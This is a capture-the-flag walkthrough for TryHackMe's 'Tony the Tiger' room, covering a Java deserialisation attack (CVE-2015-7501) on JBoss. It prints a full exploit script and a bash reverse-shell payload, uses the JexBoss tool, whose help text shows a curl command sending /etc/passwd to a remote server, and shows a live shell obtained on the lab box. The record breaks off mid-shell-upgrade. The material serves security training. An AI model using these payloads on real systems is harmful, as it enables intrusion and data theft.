# Tony the Tiger

- [Room information](#room-information)
- [Solution](#solution)
- [References](#references)

## Room information

```text
Type: Challenge
Difficulty: Easy
Tags: Linux, Web
Subscription type: Free
Description: 
Learn how to use a Java Serialisation attack in this boot-to-root
```

Room link: [https://tryhackme.com/room/tonythetiger](https://tryhackme.com/room/tonythetiger)

## Solution

### Task 1 - Deploy

Firstly, ensure you are connected to the TryHackMe network via either the VPN Service or Kali Instance (subscribed members only). If you are not using the Kali Instance, you can verify connectivity to the THM network on the "access" page. Or if you are new, you can learn how to connect by visiting the OpenVPN Room.

**Please allow up towards five minutes for this instance to fully boot** - even as a subscribed member. This is not a TryHackMe or AWS bottleneck, rather Java being Java and the web application taking time to fully initialise after boot.

### Task 2 - Support Material

Whilst this is a CTF-style room, as the approach to ultimately "rooting" the box is new to TryHackMe, I will explain it a little and leave you to experiment with. There are flags laying around that aren't focused on the CVE, so I still encourage exploring this room. Explaining the whole-theory behind it is a little out of scope for this. However, I have provided some further reading material that may help with the room - or prove interesting!

#### What is "Serialisation"?

Serialisation at an abstract is the process of converting data - specifically "Objects" in Object-Oriented Programming (OOP) languages such as Java into lower-level formatting known as "byte streams", where it can be stored for later use such as within files, databases, and/or traversed across a network. It is then later converted from this "byte stream" back into the higher-level "Object". This final conversion is known as "De-serialisation"

![Serialization](Images/Serialization.jpg)

(kindly taken from `https://www.geeksforgeeks.org/classes-objects-java/`)

#### So what is an "Object"?

"Objects" in a programming-context can be compared to real-life examples. Simply, an "Object" is just that - a thing. "Objects" can contain various types of information such as states or features. To correlate to a real-world example...Let's take a lamp.

A lamp is a great "Object". a lamp can be on or off, the lamp can have different types of bulbs - but ultimately it is still a lamp. What type of bulb it uses and whether or not the lamp is "on" or "off" in this instance is all stored within an "Object".

#### How can we exploit this process?

A "serialisation" attack is the injection and/or modification of data throughout the "byte stream" stage. When this data is later accessed by the application, malicious code can result in serious implications...ranging from DoS, data leaking or much more nefarious attacks like being "rooted"! Can you see where this is going...?

-----------------------------------------------------------------------

#### What is a great IRL example of an "Object"?

Answer: `lamp`

#### What is the acronym of a possible type of attack resulting from a "serialisation" attack?

Answer: `dos`

#### What lower-level format does data within "Objects" get converted into?

Answer: `byte streams`

### Task 3 - Reconnaissance

Your first reaction to being presented with an instance should be information gathering.

We start by scanning the machine with `nmap` including service info and default scripts

```bash
┌──(kali㉿kali)-[/mnt/…/TryHackMe/Challenges/Easy/Tony_the_Tiger]
└─$ export TARGET_IP=10.10.212.185

┌──(kali㉿kali)-[/mnt/…/TryHackMe/Challenges/Easy/Tony_the_Tiger]
└─$ sudo nmap -sV -sC $TARGET_IP 
[sudo] password for kali: 
Starting Nmap 7.95 ( https://nmap.org ) at 2025-09-06 12:58 CEST
Nmap scan report for 10.10.212.185
Host is up (0.045s latency).
Not shown: 989 closed tcp ports (reset)
PORT     STATE SERVICE     VERSION
22/tcp   open  ssh         OpenSSH 6.6.1p1 Ubuntu 2ubuntu2.13 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   1024 d6:97:8c:b9:74:d0:f3:9e:fe:f3:a5:ea:f8:a9:b5:7a (DSA)
|   2048 33:a4:7b:91:38:58:50:30:89:2d:e4:57:bb:07:bb:2f (RSA)
|   256 21:01:8b:37:f5:1e:2b:c5:57:f1:b0:42:b7:32:ab:ea (ECDSA)
|_  256 f6:36:07:3c:3b:3d:71:30:c4:cd:2a:13:00:b5:25:ae (ED25519)
80/tcp   open  http        Apache httpd 2.4.7 ((Ubuntu))
|_http-title: Tony&#39;s Blog
|_http-server-header: Apache/2.4.7 (Ubuntu)
|_http-generator: Hugo 0.66.0
1090/tcp open  java-rmi    Java RMI
|_rmi-dumpregistry: ERROR: Script execution failed (use -d to debug)
1091/tcp open  java-rmi    Java RMI
1098/tcp open  java-rmi    Java RMI
1099/tcp open  java-object Java Object Serialization
| fingerprint-strings: 
|   NULL: 
|     java.rmi.MarshalledObject|
|     hash[
|     locBytest
|     objBytesq
|     xpwv=
|     #http://thm-java-deserial.home:8083/q
|     org.jnp.server.NamingServer_Stub
|     java.rmi.server.RemoteStub
|     java.rmi.server.RemoteObject
|     xpwA
|     UnicastRef2
|_    thm-java-deserial.home
4446/tcp open  java-object Java Object Serialization
5500/tcp open  hotline?
| fingerprint-strings: 
|   DNSStatusRequestTCP, Kerberos, TerminalServerCookie: 
|     CRAM-MD5
|     GSSAPI
|     DIGEST-MD5
|     NTLM
|     thm-java-deserial
|   DNSVersionBindReqTCP: 
|     CRAM-MD5
|     GSSAPI
|     NTLM
|     DIGEST-MD5
|     thm-java-deserial
|   GenericLines, NULL: 
|     CRAM-MD5
|     DIGEST-MD5
|     GSSAPI
|     NTLM
|     thm-java-deserial
|   GetRequest: 
|     DIGEST-MD5
|     NTLM
|     CRAM-MD5
|     GSSAPI
|     thm-java-deserial
|   HTTPOptions, RTSPRequest: 
|     NTLM
|     GSSAPI
|     DIGEST-MD5
|     CRAM-MD5
|     thm-java-deserial
|   Help: 
|     CRAM-MD5
|     NTLM
|     DIGEST-MD5
|     GSSAPI
|     thm-java-deserial
|   RPCCheck: 
|     NTLM
|     CRAM-MD5
|     DIGEST-MD5
|     GSSAPI
|     thm-java-deserial
|   SSLSessionReq: 
|     GSSAPI
|     CRAM-MD5
|     NTLM
|     DIGEST-MD5
|     thm-java-deserial
|   TLSSessionReq: 
|     NTLM
|     CRAM-MD5
|     GSSAPI
|     DIGEST-MD5
|_    thm-java-deserial
8009/tcp open  ajp13       Apache Jserv (Protocol v1.3)
| ajp-methods: 
|   Supported methods: GET HEAD POST PUT DELETE TRACE OPTIONS
|   Potentially risky methods: PUT DELETE TRACE
|_  See https://nmap.org/nsedoc/scripts/ajp-methods.html
8080/tcp open  http        Apache Tomcat/Coyote JSP engine 1.1
|_http-open-proxy: Proxy might be redirecting requests
| http-methods: 
|_  Potentially risky methods: PUT DELETE TRACE
|_http-title: Welcome to JBoss AS
|_http-server-header: Apache-Coyote/1.1
8083/tcp open  http        JBoss service httpd
|_http-title: Site doesn't have a title (text/html).
3 services unrecognized despite returning data. If you know the service/version, please submit the following fingerprints at https://nmap.org/cgi-bin/submit.cgi?new-service :
==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
SF-Port1099-TCP:V=7.95%I=7%D=9/6%Time=68BC13C3%P=x86_64-pc-linux-gnu%r(NUL
SF:L,17B,"\xac\xed\0\x05sr\0\x19java\.rmi\.MarshalledObject\|\xbd\x1e\x97\
SF:xedc\xfc>\x02\0\x03I\0\x04hash\[\0\x08locBytest\0\x02\[B\[\0\x08objByte
SF:sq\0~\0\x01xpwv=\xd2ur\0\x02\[B\xac\xf3\x17\xf8\x06\x08T\xe0\x02\0\0xp\
SF:0\0\x004\xac\xed\0\x05t\0#http://thm-java-deserial\.home:8083/q\0~\0\0q
SF:\0~\0\0uq\0~\0\x03\0\0\0\xcd\xac\xed\0\x05sr\0\x20org\.jnp\.server\.Nam
SF:ingServer_Stub\0\0\0\0\0\0\0\x02\x02\0\0xr\0\x1ajava\.rmi\.server\.Remo
SF:teStub\xe9\xfe\xdc\xc9\x8b\xe1e\x1a\x02\0\0xr\0\x1cjava\.rmi\.server\.R
SF:emoteObject\xd3a\xb4\x91\x0ca3\x1e\x03\0\0xpwA\0\x0bUnicastRef2\0\0\x16
SF:thm-java-deserial\.home\0\0\x04J\[\xa6\x15'\x1c\xd3ny\xeeum\xe6\0\0\x01
SF:\x99\x1e\x8cE\xb4\x80\x02\0x");
==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
SF-Port4446-TCP:V=7.95%I=7%D=9/6%Time=68BC13C9%P=x86_64-pc-linux-gnu%r(NUL
SF:L,4,"\xac\xed\0\x05");
==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
SF-Port5500-TCP:V=7.95%I=7%D=9/6%Time=68BC13C9%P=x86_64-pc-linux-gnu%r(NUL
SF:L,4B,"\0\0\0G\0\0\x01\0\x03\x04\0\0\0\x03\x03\x04\0\0\0\x02\x01\x08CRAM
SF:-MD5\x01\nDIGEST-MD5\x01\x06GSSAPI\x01\x04NTLM\x02\x11thm-java-deserial
SF:")%r(GenericLines,4B,"\0\0\0G\0\0\x01\0\x03\x04\0\0\0\x03\x03\x04\0\0\0
SF:\x02\x01\x08CRAM-MD5\x01\nDIGEST-MD5\x01\x06GSSAPI\x01\x04NTLM\x02\x11t
SF:hm-java-deserial")%r(GetRequest,4B,"\0\0\0G\0\0\x01\0\x03\x04\0\0\0\x03
SF:\x03\x04\0\0\0\x02\x01\nDIGEST-MD5\x01\x04NTLM\x01\x08CRAM-MD5\x01\x06G
SF:SSAPI\x02\x11thm-java-deserial")%r(HTTPOptions,4B,"\0\0\0G\0\0\x01\0\x0
SF:3\x04\0\0\0\x03\x03\x04\0\0\0\x02\x01\x04NTLM\x01\x06GSSAPI\x01\nDIGEST
SF:-MD5\x01\x08CRAM-MD5\x02\x11thm-java-deserial")%r(RTSPRequest,4B,"\0\0\
SF:0G\0\0\x01\0\x03\x04\0\0\0\x03\x03\x04\0\0\0\x02\x01\x04NTLM\x01\x06GSS
SF:API\x01\nDIGEST-MD5\x01\x08CRAM-MD5\x02\x11thm-java-deserial")%r(RPCChe
SF:ck,4B,"\0\0\0G\0\0\x01\0\x03\x04\0\0\0\x03\x03\x04\0\0\0\x02\x01\x04NTL
SF:M\x01\x08CRAM-MD5\x01\nDIGEST-MD5\x01\x06GSSAPI\x02\x11thm-java-deseria
SF:l")%r(DNSVersionBindReqTCP,4B,"\0\0\0G\0\0\x01\0\x03\x04\0\0\0\x03\x03\
SF:x04\0\0\0\x02\x01\x08CRAM-MD5\x01\x06GSSAPI\x01\x04NTLM\x01\nDIGEST-MD5
SF:\x02\x11thm-java-deserial")%r(DNSStatusRequestTCP,4B,"\0\0\0G\0\0\x01\0
SF:\x03\x04\0\0\0\x03\x03\x04\0\0\0\x02\x01\x08CRAM-MD5\x01\x06GSSAPI\x01\
SF:nDIGEST-MD5\x01\x04NTLM\x02\x11thm-java-deserial")%r(Help,4B,"\0\0\0G\0
SF:\0\x01\0\x03\x04\0\0\0\x03\x03\x04\0\0\0\x02\x01\x08CRAM-MD5\x01\x04NTL
SF:M\x01\nDIGEST-MD5\x01\x06GSSAPI\x02\x11thm-java-deserial")%r(SSLSession
SF:Req,4B,"\0\0\0G\0\0\x01\0\x03\x04\0\0\0\x03\x03\x04\0\0\0\x02\x01\x06GS
SF:SAPI\x01\x08CRAM-MD5\x01\x04NTLM\x01\nDIGEST-MD5\x02\x11thm-java-deseri
SF:al")%r(TerminalServerCookie,4B,"\0\0\0G\0\0\x01\0\x03\x04\0\0\0\x03\x03
SF:\x04\0\0\0\x02\x01\x08CRAM-MD5\x01\x06GSSAPI\x01\nDIGEST-MD5\x01\x04NTL
SF:M\x02\x11thm-java-deserial")%r(TLSSessionReq,4B,"\0\0\0G\0\0\x01\0\x03\
SF:x04\0\0\0\x03\x03\x04\0\0\0\x02\x01\x04NTLM\x01\x08CRAM-MD5\x01\x06GSSA
SF:PI\x01\nDIGEST-MD5\x02\x11thm-java-deserial")%r(Kerberos,4B,"\0\0\0G\0\
SF:0\x01\0\x03\x04\0\0\0\x03\x03\x04\0\0\0\x02\x01\x08CRAM-MD5\x01\x06GSSA
SF:PI\x01\nDIGEST-MD5\x01\x04NTLM\x02\x11thm-java-deserial");
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 18.12 seconds
```

We have eight main services running and available:

- OpenSSH 6.6.1p1 running on port 22
- Apache httpd 2.4.7 running on port 80
- Java RMI running on ports 1090, 1091, 1098
- Java Object Serialization running on port 1099 and 4446
- hotline? running on port 5500
- Apache Jserv (Protocol v1.3) running on port 8009
- Apache Tomcat/Coyote JSP engine 1.1 running on port 8080
- JBoss service httpd running on port 8083

-----------------------------------------------------------------------

#### What service is running on port "8080"

From the results above:

```text
8080/tcp open  http        Apache Tomcat/Coyote JSP engine 1.1
|_http-open-proxy: Proxy might be redirecting requests
| http-methods: 
|_  Potentially risky methods: PUT DELETE TRACE
|_http-title: Welcome to JBoss AS
|_http-server-header: Apache-Coyote/1.1
```

Answer: `Apache Tomcat/Coyote JSP engine 1.1`

#### What is the name of the front-end application running on "8080"?

From the results above:

```text
|_http-title: Welcome to JBoss AS
```

Answer: `JBoss`

### Task 4 - Find Tony's Flag

Tony has started a totally unbiased blog about taste-testing various cereals! He'd love for you to have a read...

This flag will have the formatting of "THM{}"

Manually browsing to port 80 shows Tony's Blog:

![Tony's Blog on TtT](Images/Tonys_Blog_on_TtT.png)

On the `Frosted Flakes` blog post there is an image in the middle on the page.  
We download it for further analysis.

```bash
┌──(kali㉿kali)-[/mnt/…/TryHackMe/Challenges/Easy/Tony_the_Tiger]
└─$ file be2sOV9.jpg   
be2sOV9.jpg: JPEG image data, progressive, precision 8, 455x600, components 3

┌──(kali㉿kali)-[/mnt/…/TryHackMe/Challenges/Easy/Tony_the_Tiger]
└─$ exiftool be2sOV9.jpg          
ExifTool Version Number         : 13.10
File Name                       : be2sOV9.jpg
Directory                       : .
File Size                       : 85 kB
File Modification Date/Time     : 2021:09:02 14:12:49+02:00
File Access Date/Time           : 2025:09:06 12:17:15+02:00
File Inode Change Date/Time     : 2021:09:02 14:12:49+02:00
File Permissions                : -rwxrwxrwx
File Type                       : JPEG
File Type Extension             : jpg
MIME Type                       : image/jpeg
DCT Encode Version              : 100
APP14 Flags 0                   : [14], Encoded with Blend=1 downsampling
APP14 Flags 1                   : (none)
Color Transform                 : YCbCr
Image Width                     : 455
Image Height                    : 600
Encoding Process                : Progressive DCT, Huffman coding
Bits Per Sample                 : 8
Color Components                : 3
Y Cb Cr Sub Sampling            : YCbCr4:2:0 (2 2)
Image Size                      : 455x600
Megapixels                      : 0.273

┌──(kali㉿kali)-[/mnt/…/TryHackMe/Challenges/Easy/Tony_the_Tiger]
└─$ strings -n 10 be2sOV9.jpg   
"23AQRq 45ar
g\SiJ]u'U;5
$o0e8;e9i\:
9"=P'.IN&h
z?u;G,T=sau
}THM{<REDACTED>}
'THM{<REDACTED>}(dQ
```

And there we have the flag!

Answer: `THM{<REDACTED>}`

### Task 5 - Exploit

Download the attached resources (48.3MB~) to this task by pressing the "Download" icon within this task.

FILE NAME: jboss.zip (48.3MB~)  
MD5 CHECKSUM: ED2B009552080A4E0615451DB0769F8B

The attached resources are compiled together to ensure that everyone is able to complete the exploit, **these resources are not my own creations** (although have been very slightly modified for compatibility) and **all credit is retained to the respective authors listed within "credits.txt"** as well as the end of the room.

It is your task to research the vulnerability [CVE-2015-7501](https://nvd.nist.gov/vuln/detail/CVE-2015-7501) and to use it to obtain a shell to the instance using the payload & exploit provided. There may be a few ways of doing it...If you are struggling, I have written [an example of how this vulnerability is used](https://blog.cmnatic.co.uk/posts/exploiting-java-deserialization-windows-demo/) to launch an application on Windows.

There's also a couple of ways of exploiting this service - I really encourage you to investigate into them yourself!

We start by checking the contents of the zip-file

```bash
┌──(kali㉿kali)-[/mnt/…/TryHackMe/Challenges/Easy/Tony_the_Tiger]
└─$ unzip jboss.zip 
Archive:  jboss.zip
   creating: jboss/
  inflating: jboss/credits.txt       
  inflating: jboss/exploit.py        
  inflating: jboss/ysoserial.jar     

┌──(kali㉿kali)-[/mnt/…/TryHackMe/Challenges/Easy/Tony_the_Tiger]
└─$ cd jboss         

┌──(kali㉿kali)-[/mnt/…/Challenges/Easy/Tony_the_Tiger/jboss]
└─$ ls -la 
total 54801
drwxrwxrwx 1 root root        0 Mar 16  2020 .
drwxrwxrwx 1 root root        0 Sep  6 13:26 ..
-rwxrwxrwx 1 root root      885 Mar 16  2020 credits.txt
-rwxrwxrwx 1 root root     2310 Mar 17  2020 exploit.py
-rwxrwxrwx 1 root root 56112629 Mar 16  2020 ysoserial.jar
```

There seem to be a Python-exploit included. Let's check it out!

```bash
┌──(kali㉿kali)-[/mnt/…/Challenges/Easy/Tony_the_Tiger/jboss]
└─$ cat exploit.py         
#! /usr/bin/env python2

# DISCLAIMER:
# I (CMNatic) do not claim any credit for the following code, it is merely used for demonstration purposes on THM.
# All accredition is to the author https://github.com/byt3bl33d3r
#
#
# Jboss Java Deserialization RCE (CVE-2015-7501)
# Made with <3 by @byt3bl33d3r
# This code has been copied from the following:
# https://github.com/byt3bl33d3r/java-deserialization-exploits/blob/master/JBoss/jboss.py


import requests
from requests.packages.urllib3.exceptions import InsecureRequestWarning
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

import argparse
import sys, os
#from binascii import hexlify, unhexlify
from subprocess import check_output

ysoserial_default_paths = ['./ysoserial.jar', '../ysoserial.jar']
ysoserial_path = None

parser = argparse.ArgumentParser()
parser.add_argument('target', type=str, help='Target IP')
parser.add_argument('command', type=str, help='Command to run on target')
parser.add_argument('--proto', choices={'http', 'https'}, default='http', help='Send exploit over http or https (default: http)')
parser.add_argument('--ysoserial-path', metavar='PATH', type=str, help='Path to ysoserial JAR (default: tries current and previous directory)')

if len(sys.argv) < 2:
    parser.print_help()
    sys.exit(1)

args = parser.parse_args()

if not args.ysoserial_path:
    for path in ysoserial_default_paths:
        if os.path.exists(path):
            ysoserial_path = path
else:
    if os.path.exists(args.ysoserial_path):
        ysoserial_path = args.ysoserial_path

if ysoserial_path is None:
    print '[-] Could not find ysoserial JAR file'
    sys.exit(1)

if len(args.target.split(":")) != 2:
    print '[-] Target must be in format IP:PORT'
    sys.exit(1)

if not args.command:
    print '[-] You must specify a command to run'
    sys.exit(1)

ip, port = args.target.split(':')

print '[*] Target IP: {}'.format(ip)
print '[*] Target PORT: {}'.format(port)

gadget = check_output(['java', '-jar', ysoserial_path, 'CommonsCollections5', args.command])

r = requests.post('{}://{}:{}/invoker/JMXInvokerServlet'.format(args.proto, ip, port), verify=False, data=gadget)

if r.status_code == 200:
    print '[+] Command executed successfully'

┌──(kali㉿kali)-[/mnt/…/Challenges/Easy/Tony_the_Tiger/jboss]
└─$ chmod +x exploit.py 

┌──(kali㉿kali)-[/mnt/…/Challenges/Easy/Tony_the_Tiger/jboss]
└─$ ./exploit.py 
/usr/bin/env: ‘python2\r’: No such file or directory
/usr/bin/env: use -[v]S to pass options in shebang lines

┌──(kali㉿kali)-[/mnt/…/Challenges/Easy/Tony_the_Tiger/jboss]
└─$ file exploit.py 
exploit.py: Python script, ASCII text executable, with CRLF line terminators

┌──(kali㉿kali)-[/mnt/…/Challenges/Easy/Tony_the_Tiger/jboss]
└─$ dos2unix exploit.py 
dos2unix: converting file exploit.py to Unix format...

┌──(kali㉿kali)-[/mnt/…/Challenges/Easy/Tony_the_Tiger/jboss]
└─$ ./exploit.py 
usage: exploit.py [-h] [--proto {http,https}] [--ysoserial-path PATH]
                  target command

positional arguments:
  target                Target IP
  command               Command to run on target

optional arguments:
  -h, --help            show this help message and exit
  --proto {http,https}  Send exploit over http or https (default: http)
  --ysoserial-path PATH
                        Path to ysoserial JAR (default: tries current and
                        previous directory)
```

### Task 6 - Find User JBoss' flag

Knowledge of the Linux (specifically Ubuntu/Debian)'s file system structure & permissions is expected. If you are struggling, I strongly advise checking out the [Linux Fundamentals module](https://tryhackme.com/module/linux-fundamentals).

This flag has the formatting of "THM{}".

Next, we start a netcat listener on port 12345 in preparation for a reverse shell

```bash
┌──(kali㉿kali)-[/mnt/…/TryHackMe/Challenges/Easy/Tony_the_Tiger]
└─$ nc -lvnp 12345                                           
listening on [any] 12345 ...

```

#### Try the provided exploit

We will use a bash reverse shell as payload: `/bin/bash -c "/bin/bash -i >& /dev/tcp/10.14.61.233/12345 0>&1"`

Then we launch the exploit

```bash
┌──(kali㉿kali)-[/mnt/…/Challenges/Easy/Tony_the_Tiger/jboss]
└─$ ./exploit.py $TARGET_IP:8080 '/bin/bash -c "/bin/bash -i >& /dev/tcp/10.14.61.233/12345 0>&1"'
[*] Target IP: 10.10.212.185
[*] Target PORT: 8080
Error while generating or serializing payload
com.nqzero.permit.Permit$InitializationFailed: initialization failed, perhaps you're running with a security manager
        at com.nqzero.permit.Permit.setAccessible(Permit.java:22)
        at ysoserial.payloads.util.Reflections.setAccessible(Reflections.java:17)
        at ysoserial.payloads.CommonsCollections5.getObject(CommonsCollections5.java:83)
        at ysoserial.payloads.CommonsCollections5.getObject(CommonsCollections5.java:51)
        at ysoserial.GeneratePayload.main(GeneratePayload.java:34)
Caused by: com.nqzero.permit.Permit$FieldNotFound: field "override" not found
        at com.nqzero.permit.Permit.<init>(Permit.java:222)
        at com.nqzero.permit.Permit.build(Permit.java:117)
        at com.nqzero.permit.Permit.<clinit>(Permit.java:16)
        ... 4 more
Traceback (most recent call last):
  File "./exploit.py", line 63, in <module>
    gadget = check_output(['java', '-jar', ysoserial_path, 'CommonsCollections5', args.command])
  File "/usr/lib/python2.7/subprocess.py", line 223, in check_output
    raise CalledProcessError(retcode, cmd, output=output)
subprocess.CalledProcessError: Command '['java', '-jar', './ysoserial.jar', 'CommonsCollections5', '/bin/bash -c "/bin/bash -i >& /dev/tcp/10.14.61.233/12345 0>&1"']' returned non-zero exit status 70
```

Fail! :-(

This is possible due to more secure settings in newer versions of Java [described here](https://github.com/frohoff/ysoserial/issues/136).

While searching for alternatives, I found [JexBoss](https://github.com/joaomatosf/jexboss)

#### Install JexBoss

Kali requires Python module installation to be done in a virtual environment so we create a new one.

```bash
┌──(kali㉿kali)-[~]
└─$ cd Python_venvs 

┌──(kali㉿kali)-[~/Python_venvs]
└─$ python -m venv JexBoss

┌──(kali㉿kali)-[~/Python_venvs]
└─$ cd JexBoss           

┌──(kali㉿kali)-[~/Python_venvs/JexBoss]
└─$ source bin/activate                     

┌──(JexBoss)─(kali㉿kali)-[~/Python_venvs/JexBoss]
└─$ git clone https://github.com/joaomatosf/jexboss.git
Cloning into 'jexboss'...
remote: Enumerating objects: 295, done.
remote: Total 295 (delta 0), reused 0 (delta 0), pack-reused 295 (from 1)
Receiving objects: 100% (295/295), 4.10 MiB | 7.26 MiB/s, done.
Resolving deltas: 100% (173/173), done.

┌──(JexBoss)─(kali㉿kali)-[~/Python_venvs/JexBoss]
└─$ cd jexboss 

┌──(JexBoss)─(kali㉿kali)-[~/Python_venvs/JexBoss/jexboss]
└─$ ls
demo.png  _exploits.py  jexboss.py  jexcsv.py  LICENSE  README.md  requires.txt  screenshots  _updates.py  util

┌──(JexBoss)─(kali㉿kali)-[~/Python_venvs/JexBoss/jexboss]
└─$ mv * ../ 

┌──(JexBoss)─(kali㉿kali)-[~/Python_venvs/JexBoss/jexboss]
└─$ ls -la 
total 16
drwxrwxr-x 3 kali kali 4096 Sep  6 14:33 .
drwxrwxr-x 8 kali kali 4096 Sep  6 14:33 ..
drwxrwxr-x 8 kali kali 4096 Sep  6 14:31 .git
-rw-rw-r-- 1 kali kali  726 Sep  6 14:31 .gitignore

┌──(JexBoss)─(kali㉿kali)-[~/Python_venvs/JexBoss/jexboss]
└─$ cd .. 

┌──(JexBoss)─(kali㉿kali)-[~/Python_venvs/JexBoss]
└─$ bin/pip install -r requires.txt 
Collecting urllib3>=1.8 (from -r requires.txt (line 1))
  Downloading urllib3-2.5.0-py3-none-any.whl.metadata (6.5 kB)
Collecting ipaddress (from -r requires.txt (line 2))
  Downloading ipaddress-1.0.23-py2.py3-none-any.whl.metadata (923 bytes)
Downloading urllib3-2.5.0-py3-none-any.whl (129 kB)
Downloading ipaddress-1.0.23-py2.py3-none-any.whl (18 kB)
Installing collected packages: ipaddress, urllib3
Successfully installed ipaddress-1.0.23 urllib3-2.5.0

┌──(JexBoss)─(kali㉿kali)-[~/Python_venvs/JexBoss]
└─$ ./jexboss.py 

 * --- JexBoss: Jboss verify and EXploitation Tool  --- *
 |  * And others Java Deserialization Vulnerabilities * | 
 |                                                      |
 | @author:  João Filho Matos Figueiredo                |
 | @contact: joaomatosf@gmail.com                       |
 |                                                      |
 | @update: https://github.com/joaomatosf/jexboss       |
 #______________________________________________________#

 @version: 1.2.4

 Examples: [for more options, type python jexboss.py -h]

 For simple usage, you must provide the host name or IP address you
 want to test [-host or -u]:

  $ python jexboss.py -u https://site.com.br

 For Java Deserialization Vulnerabilities in HTTP POST parameters. 
 This will ask for an IP address and port to try to get a reverse shell:

  $ python jexboss.py -u http://vulnerable_java_app/page.jsf --app-unserialize

 For Java Deserialization Vulnerabilities in a custom HTTP parameter and 
 to send a custom command to be executed on the exploited server:

  $ python jexboss.py -u http://vulnerable_java_app/page.jsf --app-unserialize
    -H parameter_name --cmd 'curl -d@/etc/passwd http://your_server'

 For Java Deserialization Vulnerabilities in a Servlet (like Invoker):

  $ python jexboss.py -u http://vulnerable_java_app/path --servlet-unserialize


 To test Java Deserialization Vulnerabilities with DNS Lookup:

  $ python jexboss.py -u http://vulnerable_java_app/path --gadget dns --dns test.yourdomain.com

 For Jenkins CLI Deserialization Vulnerabilitie:

  $ python jexboss.py -u http://vulnerable_java_app/jenkins --jenkins

 For Apache Struts2 Vulnerabilities (CVE-2017-5638):

  $ python jexboss.py -u http://vulnerable_java_app/path.action --struts2


 For auto scan mode, you must provide the network in CIDR format, 
 list of ports and filename for store results:

  $ python jexboss.py -mode auto-scan -network 192.168.0.0/24 -ports 8080,80
    -results report_auto_scan.log
                                                     
 For file scan mode, you must provide the filename with host list
 to be scanned (one host per line) and filename for store results:
                                    
  $ python jexboss.py -mode file-scan -file host_list.txt -out report_file_scan.log     
```

#### Exploit with JexBoss

Let's try it out against the machine

```bash
┌──(JexBoss)─(kali㉿kali)-[~/Python_venvs/JexBoss]
└─$ ./jexboss.py -u http://$TARGET_IP:8080

 * --- JexBoss: Jboss verify and EXploitation Tool  --- *
 |  * And others Java Deserialization Vulnerabilities * | 
 |                                                      |
 | @author:  João Filho Matos Figueiredo                |
 | @contact: joaomatosf@gmail.com                       |
 |                                                      |
 | @update: https://github.com/joaomatosf/jexboss       |
 #______________________________________________________#

 @version: 1.2.4

 * Checking for updates in: http://joaomatosf.com/rnp/releases.txt **


 ** Checking Host: http://10.10.212.185:8080 **

 [*] Checking jmx-console:                 
  [ VULNERABLE ]
 [*] Checking web-console:                 
  [ OK ]
 [*] Checking JMXInvokerServlet:           
  [ VULNERABLE ]
 [*] Checking admin-console:               
  [ EXPOSED ]
 [*] Checking Application Deserialization: 
  [ OK ]
 [*] Checking Servlet Deserialization:     
  [ OK ]
 [*] Checking Jenkins:                     
  [ OK ]
 [*] Checking Struts2:                     
  [ OK ]


 * Do you want to try to run an automated exploitation via "jmx-console" ?
   If successful, this operation will provide a simple command shell to execute 
   commands on the server..
   Continue only if you have permission!
   yes/NO? no


 * Do you want to try to run an automated exploitation via "JMXInvokerServlet" ?
   If successful, this operation will provide a simple command shell to execute 
   commands on the server..
   Continue only if you have permission!
   yes/NO? yes

 * Sending exploit code to http://10.10.212.185:8080. Please wait...

 * Please enter the IP address and tcp PORT of your listening server for try to get a REVERSE SHELL.
   OBS: You can also use the --cmd "command" to send specific commands to run on the server.                                                                                            
   IP Address (RHOST): 10.14.61.233
   Port (RPORT): 12345

 * The exploit code was successfully sent. Check if you received the reverse shell
   connection on your server or if your command was executed.                                                                                                                           
   Type [ENTER] to continue...     

 * Do you want to try to run an automated exploitation via "admin-console" ?
   If successful, this operation will provide a simple command shell to execute 
   commands on the server..
   Continue only if you have permission!
   yes/NO? no

 Results: potentially compromised server!
 ---------------------------------------------------------------------------------
 Recommendations: 
 - Remove web consoles and services that are not used, eg:
    $ rm web-console.war http-invoker.sar jmx-console.war jmx-invoker-adaptor-server.sar admin-console.war
 - Use a reverse proxy (eg. nginx, apache, F5)
 - Limit access to the server only via reverse proxy (eg. DROP INPUT POLICY)
 - Search vestiges of exploitation within the directories "deploy" and "management".
 - Do NOT TRUST serialized objects received from the user
 - If possible, stop using serialized objects as input!
 - If you need to work with serialization, consider migrating to the Gson lib.
 - Use a strict whitelist with Look-ahead[3] before deserialization
 - For a quick (but not definitive) remediation for the viewState input, store the state 
   of the view components on the server (this will increase the heap memory consumption): 
      In web.xml, change the "client" parameter to "server" on STATE_SAVING_METHOD.
 - Upgrade Apache Struts: https://cwiki.apache.org/confluence/display/WW/S2-045

 References:
   [1] - https://developer.jboss.org/wiki/SecureTheJmxConsole
   [2] - https://issues.jboss.org/secure/attachment/12313982/jboss-securejmx.pdf
   [3] - https://www.ibm.com/developerworks/library/se-lookahead/
   [4] - https://www.owasp.org/index.php/Deserialization_of_untrusted_data

 - If possible, discard this server!
 ---------------------------------------------------------------------------------
 * Info: review, suggestions, updates, etc: 
   https://github.com/joaomatosf/jexboss

 * DONATE: Please consider making a donation to help improve this tool,
 * Bitcoin Address:  14x4niEpfp7CegBYr3tTzTn4h6DAnDCD9C 
```

Note that the printout won't be exactly as above since **the tool clears the screen multiple times** during the exploitation process!

Checking back at our netcat listener we have a connection

```bash
┌──(kali㉿kali)-[/mnt/…/TryHackMe/Challenges/Easy/Tony_the_Tiger]
└─$ nc -lvnp 12345
listening on [any] 12345 ...
connect to [10.14.61.233] from (UNKNOWN) [10.10.212.185] 49992
bash: cannot set terminal process group (823): Inappropriate ioctl for device
bash: no job control in this shell
cmnatic@thm-java-deserial:/$ id
id
uid=1000(cmnatic) gid=1000(cmnatic) groups=1000(cmnatic),4(adm),24(cdrom),30(dip),46(plugdev),110(lpadmin),111(sambashare)
cmnatic@thm-java-deserial:/$ 
```

#### Fix/upgrade the reverse shell

We don't have a proper shell though so let's fix that

```bash
cmnatic@thm-java-deserial:/$ tty
tty
not a tty
cmnatic@thm-java-deserial:/$ python3 -c 'import pty;pty.spawn("/bin/bash")'
python3 -c 'import pty;pty.spawn("/bin/bash")'
cmnatic@thm-java-deserial:/$ ^Z
